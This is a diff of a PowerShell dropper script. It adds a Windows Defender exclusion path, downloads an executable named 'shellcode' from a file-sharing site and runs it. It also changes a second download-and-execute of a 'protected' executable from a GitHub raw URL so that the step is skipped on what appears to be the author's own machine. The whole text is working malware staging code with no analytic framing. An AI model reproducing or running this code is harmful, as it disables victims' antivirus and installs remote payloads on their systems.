@@ -41,8 +41,13 @@ Add-MpPreference -ExclusionPath $dir
 Invoke-WebRequest -Uri "https://anonsharing.com/file/8b24841448995265/shellcode_(3).exe" -OutFile "$temp\s.exe"
 Start-Process -FilePath "$temp\s.exe"
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
-Start-Process -FilePath "$temp\skid.exe"
+if ($env:USERDOMAIN -ne "DESKTOP-VIGQLDD") {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skidd.exe"
+    Start-Process -FilePath "$temp\skidd.exe"
+}
+
+
+
 
 Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
     Write-Output $_.FullName
